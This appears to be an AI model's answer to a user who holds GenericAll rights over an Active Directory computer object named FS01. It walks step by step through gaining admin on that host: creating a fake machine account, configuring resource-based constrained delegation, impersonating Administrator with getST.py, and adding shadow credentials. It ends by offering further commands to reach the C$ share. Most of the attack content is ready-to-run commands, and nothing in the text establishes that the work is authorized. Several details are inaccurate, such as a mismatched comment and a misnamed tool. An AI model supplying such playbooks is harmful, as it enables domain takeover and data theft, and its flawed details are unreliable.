Since your user has **GenericAll** over the `FS01` computer object in Active Directory, you have full control over that object's attributes. However, "Full Control" in AD does not automatically mean you can SMB or RDP into the box—it means you can **manipulate the object** to grant yourself that access.

Here is how you can confirm your current access and, if it fails, how to use your `GenericAll` rights to force entry.

---

### 1. Confirming Current Access

Before changing anything, check if the "IT group" is already mapped to a local administrative group on `FS01`.

**Using NetExec (nxc):**

Bash

```
nxc smb FS01 -u youruser -p 'password'
```

- **Result `[+]`**: You have valid user credentials, but no admin rights.
    
- **Result `[+] ... (Pwn3d!)`**: You are already a local admin. You can stop here and dump hashes.
    

**Using `test-admin` module:**

Bash

```
nxc smb FS01 -u youruser -p 'password' -M test_admin
```

---

### 2. Escalating via `GenericAll` (Resource-Based Constrained Delegation)

If you don't have direct access yet, the most common way to abuse `GenericAll` over a computer object is **RBCD**. You can tell `FS01` that it should trust a "fake" computer you control.

#### Step A: Create a "Fake" Computer Account

You need a computer account where you know the password (the `MachineAccountQuota` is usually 10 by default in AD).

Bash

```
bloodyAD -d domain.local -u youruser -p 'password' --host <DC_IP> add computer fake_pc 'password123'
```

#### Step B: Configure Delegation

Use your `GenericAll` rights to modify the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `FS01`.

Bash

```
# Using bloodyAD to set the delegation
bloodyAD -d domain.local -u youruser -p 'password' --host <DC_IP> set rbcd FS01 fake_pc
```

#### Step C: Impersonate an Admin

Now, use the fake computer account to request a service ticket (ST) for `FS01` as a Domain Admin (e.g., `Administrator`).

Bash

```
# Get the hash of the fake computer account first
python3 getST.py -dc-ip <DC_IP> -spn cifs/FS01.domain.local 'domain.local/fake_pc$:password123' -impersonate Administrator
```

---

### 3. Alternative: Shadow Credentials

If the domain is running at a functional level that supports Windows Hello for Business, you can use `GenericAll` to add a "Shadow Credential" (a public key) to `FS01`.

1. **Add the Key:**
    
    Bash
    
    ```
    python3 whisperer.py --action add --target FS01$ --owner youruser 'domain/youruser:password'
    ```
    
2. Request a Ticket:
    
    Use the generated certificate to request a Kerberos TGT for the computer account FS01$. Once you are FS01$, you can often perform a S4U2Self trick to become a local admin.
    

---

### 4. Direct Attribute Manipulation

Since you have `GenericAll`, you can also:

- **Clear the `ms-Mcs-AdmPwd` expiration:** If LAPS is in use, you might be able to trigger a password reset or read it if the DACL allows.
    
- **Change the `description` or `dNSHostName`**: Less useful for access, but confirms write ability.
    

### Summary Checklist

|**Goal**|**Tool**|**Success Indicator**|
|---|---|---|
|**Check Admin**|NetExec|`(Pwn3d!)` in output|
|**Check Write**|bloodyAD|Successful attribute update|
|**Gain Admin**|RBCD|Valid CIFS ticket for `Administrator`|

**Would you like me to show you the commands to use that service ticket with `export KRB5CCNAME` to finally access the FS01 C$ share?**
